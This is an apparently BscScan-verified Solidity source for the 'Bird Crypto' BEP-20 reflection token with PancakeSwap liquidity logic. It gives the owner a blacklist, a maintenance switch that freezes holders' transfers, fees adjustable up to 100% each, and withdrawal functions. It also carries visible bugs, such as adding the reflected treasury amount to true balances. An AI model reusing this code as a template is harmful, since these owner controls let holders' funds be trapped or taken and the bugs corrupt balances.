/**
 *Submitted for verification at BscScan.com on 2022-10-15
*/

/**
   BirdCrypto 
   
   #BirdCrypto features:
   1 billion Supply
   Transaction fee: 5% to holders, 5% to liquidity, 5% to treasury  
   100% tokens sent to liquidity      
 */
// SPDX-License-Identifier: MIT
pragma solidity >=0.7.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
abstract contract Ownable  {
    address public owner;

    constructor () {       
        owner = msg.sender;
    }    
    modifier onlyOwner() {
        require(owner == msg.sender, "onlyOwner");
        _;
    }   
    function transferOwnership(address newOwner) public virtual onlyOwner {              
        owner = newOwner;
    }
}

interface IPancakeSwapPair {
		event Approval(address indexed owner, address indexed spender, uint value);
		event Transfer(address indexed from, address indexed to, uint value);
		function name() external pure returns (string memory);
		function symbol() external pure returns (string memory);
		function decimals() external pure returns (uint8);
		function totalSupply() external view returns (uint);
		function balanceOf(address owner) external view returns (uint);
		function allowance(address owner, address spender) external view returns (uint);

		function approve(address spender, uint value) external returns (bool);
		function transfer(address to, uint value) external returns (bool);
		function transferFrom(address from, address to, uint value) external returns (bool);

		function DOMAIN_SEPARATOR() external view returns (bytes32);
		function PERMIT_TYPEHASH() external pure returns (bytes32);
		function nonces(address owner) external view returns (uint);
		function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
		event Mint(address indexed sender, uint amount0, uint amount1);
		event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
		event Swap(
				address indexed sender,
				uint amount0In,
				uint amount1In,
				uint amount0Out,
				uint amount1Out,
				address indexed to
		);
		event Sync(uint112 reserve0, uint112 reserve1);
		function MINIMUM_LIQUIDITY() external pure returns (uint);
		function factory() external view returns (address);
		function token0() external view returns (address);
		function token1() external view returns (address);
		function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
		function price0CumulativeLast() external view returns (uint);
		function price1CumulativeLast() external view returns (uint);
		function kLast() external view returns (uint);
		function mint(address to) external returns (uint liquidity);
		function burn(address to) external returns (uint amount0, uint amount1);
		function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
		function skim(address to) external;
		function sync() external;
		function initialize(address, address) external;
}
interface IPancakeSwapRouter{
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
            address tokenA,
            address tokenB,
            uint amountADesired,
            uint amountBDesired,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
            address token,
            uint amountTokenDesired,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
            address token,
            uint liquidity,
            uint amountTokenMin,
            uint amountETHMin,
            address to,
            uint deadline,
            bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
            uint amountOut,
            uint amountInMax,
            address[] calldata path,
            address to,
            uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
            external
            payable
            returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
            external
            returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
            external
            returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
            external
            payable
            returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface IPancakeSwapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract BirdCrypto is IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    address[] private _excluded;
    mapping(address => bool) public blacklist;      
    uint256 private constant MAX = ~uint256(0);
    uint256 public override totalSupply = 1000000000 ether; //1b
    uint256 private _rTotal = (MAX - (MAX % totalSupply));
    uint256 public totalFees;
    string public name = "Bird Crypto";
    string public symbol = "BIRD";
    uint8 public decimals = 18;
    uint256 public taxFee = 5;
    uint256 private _previousTaxFee = taxFee;    
    uint256 public liquidityFee = 5;
    uint256 private _previousLiquidityFee = liquidityFee;
    uint256 public tokensIntoTreasury = 0; //% treasuryfee by token
    uint256 public treasuryFee = 5;
    uint256 private _previousTreasuryFee = treasuryFee;
    IPancakeSwapRouter public swapRouter;
    address public swapPair;
    bool inSwapAndLiquify;
    bool public swapAndEvolveEnabled = true;
    uint256 public swapAndEvolveAmount = 500000 ether; //500k ether       
    address public treasuryReceiver ;    
    address public autoLiquidityReceiver  ;    
    IERC20 public tokenB;
    bool public maintenance = false;         
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function init(address _swapRouter, address _tokenB, address _treasuryReceiver, address _autoLiquidityReceiver) public onlyOwner {                        
        //distribute tokens to owner & autoLiquidity
        _rOwned[owner] = _rTotal.div(2);
        _rOwned[_autoLiquidityReceiver] = _rTotal.div(2);
              
        //exclude owner and this contract from fee
        _isExcludedFromFee[owner] = true;
        _isExcludedFromFee[address(this)] = true;        
        //init swap
        initSwap(_swapRouter, _tokenB);   
        //set receiver
        setReceiver(_treasuryReceiver, _autoLiquidityReceiver);
    }    

    function initSwap(address _swapRouter, address _tokenB) public onlyOwner{
        // require(_swapRouter != address(0), "Exchange must be supplied");
        //Core Setup
        swapRouter = IPancakeSwapRouter(_swapRouter);
        //exclude router from fee
        _isExcludedFromFee[address(swapRouter)] = true;

        //tokenB & swappair
        tokenB = IERC20(_tokenB);
        // Create a pancakeswap pair for this new token        
        swapPair = IPancakeSwapFactory(swapRouter.factory())
            .createPair(address(this), address(tokenB));
        
        //exclude swapPair from fee & reward
        _isExcludedFromFee[address(swapPair)] = true;  
        excludeFromReward(address(swapPair));
    }        

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal);
        uint256 currentRate =  getRate();
        return rAmount.div(currentRate);
    }

    function excludeFromReward(address account) public onlyOwner() {
        require(account != address(swapRouter));
        require(!_isExcluded[account]);
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeInReward(address account) external onlyOwner() {
        require(_isExcluded[account]);
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }

    function excludeFromFee(address account, bool _value) public onlyOwner {
        _isExcludedFromFee[account] = _value;
    }
    
    //to recieve tokenB from swapRouter when swaping
    receive() external payable {}    

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        totalFees = totalFees.add(tFee);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tTreasury) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity, tTreasury, getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity, tTreasury);
    }

    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256) {
        uint256 tFee = calculateTaxFee(tAmount);
        uint256 tLiquidity = calculateLiquidityFee(tAmount);
        uint256 tTreasury = calculateTreasuryFee(tAmount);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity).sub(tTreasury);
        return (tTransferAmount, tFee, tLiquidity, tTreasury);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 tTreasury, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        uint256 rTreasury = tTreasury.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity).sub(rTreasury);
        return (rAmount, rTransferAmount, rFee);
    }

    function getRate() public view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = totalSupply;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, totalSupply);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(totalSupply)) return (_rTotal, totalSupply);
        return (rSupply, tSupply);
    }
    
    function _takeLiquidity(uint256 tLiquidity) private {
        uint256 currentRate =  getRate();
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);
        if(_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);
    }

    function _takeTreasury(uint256 tTreasury) private {
        uint256 currentRate =  getRate();
        uint256 rTreasury = tTreasury.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTreasury);
        if(_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)].add(rTreasury);
    }
    
    function calculateTaxFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(taxFee).div(
            10**2
        );
    }

    function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(liquidityFee).div(
            10**2
        );
    }
    function calculateTreasuryFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(treasuryFee).div(
            10**2
        );
    }
    
    function removeAllFee() private {
        if(taxFee == 0 && liquidityFee == 0 && treasuryFee == 0) return;
        
        _previousTaxFee = taxFee;
        _previousLiquidityFee = liquidityFee;
        _previousTreasuryFee = treasuryFee;
        
        taxFee = 0;
        liquidityFee = 0;
        treasuryFee = 0;
    }
    
    function restoreAllFee() private {
        taxFee = _previousTaxFee;
        liquidityFee = _previousLiquidityFee;
        treasuryFee = _previousTreasuryFee;
    }
    
    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!blacklist[from], "in_blacklist");      
        require(!maintenance || _isExcludedFromFee[from], "in_maintenance");
        require(amount > 0, "Transfer amount must be greater than zero");

        //check should swapAndEvolveAmount
        // is the token balance of this contract address over the min number of
        // tokens that we need to initiate a swap + liquidity lock?
        // also, don't get caught in a circular liquidity event.
        // also, don't swap & liquify if sender is pancakeswap pair.
                                
        if (
            (balanceOf(address(this)) >= swapAndEvolveAmount) &&
            !inSwapAndLiquify &&
            from != swapPair &&
            swapAndEvolveEnabled
        ) {
            //add liquidity & treasury
            uint256 treasuryAmount = swapAndEvolveAmount.mul(treasuryFee).div(treasuryFee.add(liquidityFee));
            uint256 liquidityAmount = swapAndEvolveAmount.sub(treasuryAmount);
            _swapAndTreasure(treasuryAmount);
            _swapAndLiquify(liquidityAmount); 
        }
        
        
        //indicates if fee should be deducted from transfer
        bool takeFee = true;
        
        //if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFee[from]){
            takeFee = false;
        }
        
        //transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer(from,to,amount,takeFee);
    }

    function _swapAndTreasure(uint256 amount) private lockTheSwap {      
        // split amount into 2 parts _tokensIntoTreasury & tokensSwapped
        uint256 _tokensIntoTreasury = amount.mul(tokensIntoTreasury).div(100);
        if(_tokensIntoTreasury > 0)
            _tokenTransfer(address(this), treasuryReceiver, _tokensIntoTreasury, false);    
        //swap token    
        uint256 tokensSwapped = amount.sub(_tokensIntoTreasury);  
        // swap tokens for tokenB
        if(tokensSwapped > 0)                    
            _swapTokensForTokenB(tokensSwapped, address(treasuryReceiver)); // <- this breaks the TokenB -> HATE swap when swap+liquify is triggered
    }

    function _swapAndLiquify(uint256 amount) private lockTheSwap {        
        // split the contract balance into halves
        uint256 tokensSwapped = amount.div(2);
        uint256 tokensIntoLiquidity = amount.sub(tokensSwapped);

        // capture the contract's current TokenB balance.
        // this is so that we can capture exactly the amount of TokenB that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance =  tokenB.balanceOf(address(autoLiquidityReceiver));

        // swap tokens for TokenB: error here
        _swapTokensForTokenB(tokensSwapped, address(autoLiquidityReceiver)); // <- this breaks the TokenB -> HATE swap when swap+liquify is triggered

        // how much TokenB did we just swap into?
        uint256 newBalance = tokenB.balanceOf(address(autoLiquidityReceiver)).sub(initialBalance);

        //transfer tokenb to this contract
        tokenB.transferFrom(address(autoLiquidityReceiver), address(this), newBalance);

        // add liquidity to pancakeswap
        _addLiquidity(tokensIntoLiquidity, newBalance);
        
        // emit SwapAndLiquify(tokensSwapped, newBalance, tokensIntoLiquidity);
    }

    function _swapTokensForTokenB(uint256 tokenAmount, address to) private {
        // generate the pancakeswap pair path of token -> tokenB
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(tokenB);

        _approve(address(this), address(swapRouter), tokenAmount);

        // make the swap
        swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of tokenB
            path,
            to,
            block.timestamp
        );
    }

    function _addLiquidity(uint256 tokenAmount, uint256 tokenBAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(swapRouter), tokenAmount);
        tokenB.approve(address(swapRouter), tokenBAmount);

        // add the liquidity
        swapRouter.addLiquidity(
            address(this),
            address(tokenB),
            tokenAmount,
            tokenBAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner, //token owns the liquidity
            block.timestamp
        );
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        if(!takeFee)
            removeAllFee();
        
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferFromExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _transferToExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferStandard(sender, recipient, amount);
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _transferBothExcluded(sender, recipient, amount);
        } else {
            _transferStandard(sender, recipient, amount);
        }
        
        if(!takeFee)
            restoreAllFee();
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tTreasury) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeLiquidity(tLiquidity);
        _takeTreasury(tTreasury);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tTreasury) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);     
        _takeLiquidity(tLiquidity);      
        _takeTreasury(tTreasury);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tTreasury) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
        _takeLiquidity(tLiquidity);
        _takeTreasury(tTreasury);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tTreasury) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
        _takeLiquidity(tLiquidity);
        _takeTreasury(tTreasury);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    function setBlacklist(address _addr, bool _flag) external onlyOwner {        
        blacklist[_addr] = _flag;    
    }
    
    function withdrawBNB() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    function withdrawTokenB() external onlyOwner {
        tokenB.transferFrom(address(autoLiquidityReceiver), address(this), tokenB.balanceOf(address(autoLiquidityReceiver)));
        tokenB.transfer(msg.sender,tokenB.balanceOf(address(this)));        
    }

    function withdrawToken(uint256 _amount) external onlyOwner {        
        _tokenTransfer(address(this), msg.sender, _amount, false);
    }

    function setReceiver(address _treasuryReceiver, address _autoLiquidityReceiver) public onlyOwner{
        treasuryReceiver = _treasuryReceiver;
        _isExcludedFromFee[treasuryReceiver] = true;

        autoLiquidityReceiver = _autoLiquidityReceiver;
        _isExcludedFromFee[address(autoLiquidityReceiver)] = true;
    }

    function update(uint256 tag, uint256 value)public onlyOwner {        
        if(tag==1){
            require(value <= 100, "Invalid number");
            taxFee = value;
        }
        else if(tag==2){
            require(value <= 100, "Invalid number");
            liquidityFee = value;
        }
        else if(tag==3){
            require(value <= 100, "Invalid number");
            treasuryFee = value;
        }
        else if(tag==4){
            require(value <= 100, "Invalid number");
            tokensIntoTreasury = value;
        }
        else if(tag==5){           
            swapAndEvolveEnabled = (value == 1);
        }
        else if(tag == 6){
            require(value < totalSupply && value > 0, "Invalid number");
            swapAndEvolveAmount = value;
        }else if(tag == 7){
            maintenance = (value == 1);
        }
        
    }
}